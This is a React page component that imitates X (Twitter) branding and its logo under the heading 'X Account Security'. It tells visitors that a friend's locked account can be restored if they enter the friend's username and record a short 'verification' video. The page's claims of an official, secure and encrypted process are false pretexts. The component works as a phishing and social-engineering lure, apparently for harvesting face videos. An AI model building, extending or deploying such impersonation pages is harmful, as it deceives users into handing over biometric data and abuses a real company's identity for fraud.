import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import './VerificationStart.css'

function VerificationStart() {
  const navigate = useNavigate()
  const [step, setStep] = useState(1)
  const [username, setUsername] = useState('')

  const handleContinue = () => {
    if (step === 1) {
      setStep(2)
    } else {
      // Save username to localStorage before navigating
      localStorage.setItem('username', username)
      navigate('/record')
    }
  }

  return (
    <div className="verification-page">
      <div className="verification-container">
        {step === 1 ? (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>
            
            <h1 className="verification-title">Welcome to X Account Security</h1>
            
            <p className="verification-description">
              Your friend's account accessibility is limited, so we ask that higher 
              security requirements be applied to that account. We created this 
              security program to unlock the friend accounts.
            </p>

            <div className="help-notice">
              <p className="help-text">
                I'm helping confirm my friend's identity so they can get back into their X account.
              </p>
            </div>

            <div className="info-box">
              <p className="info-header">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0" style={{marginRight: '8px'}}>
                  <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                </svg>
                Below, we walk you through the process in detail and help you fully activate to unlock the account.
              </p>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>Quick 10-second video verification</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>Secure and encrypted process</span>
              </div>
              <div className="info-item">
                <svg viewBox="0 0 24 24" width="20" height="20" fill="#1d9bf0">
                  <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                </svg>
                <span>Help restore your friend's access</span>
              </div>
            </div>

            <button className="btn-continue" onClick={handleContinue}>
              Continue
            </button>

            <p className="privacy-note">
              By continuing, you agree to help verify your friend's identity. 
              Your video will be securely stored and used only for verification purposes 
              to unlock your friend's X account.
            </p>
          </div>
        ) : (
          <div className="verification-content">
            {/* X Logo at top */}
            <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
              <g>
                <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
              </g>
            </svg>

            <h1 className="verification-title">Enter Your Friend's Username</h1>
            
            <p className="verification-description">
              Please enter your friend's X username - the account that needs to be unlocked.
            </p>

            <div className="input-group">
              <label htmlFor="username">Friend's X Username</label>
              <div className="input-wrapper">
                <span className="input-prefix">@</span>
                <input
                  type="text"
                  id="username"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  placeholder="friendusername"
                  className="input-field"
                />
              </div>
            </div>

            <div className="help-box">
              <p>By verifying, you confirm that:</p>
              <ul>
                <li>You know this person personally</li>
                <li>You're helping them regain access to their account</li>
                <li>The information you provide is accurate</li>
              </ul>
            </div>

            <button 
              className="btn-continue" 
              onClick={handleContinue}
              disabled={!username.trim()}
            >
              Start Verification
            </button>

            <button className="btn-back" onClick={() => setStep(1)}>
              Back
            </button>
          </div>
        )}
      </div>
    </div>
  )
}

export default VerificationStart
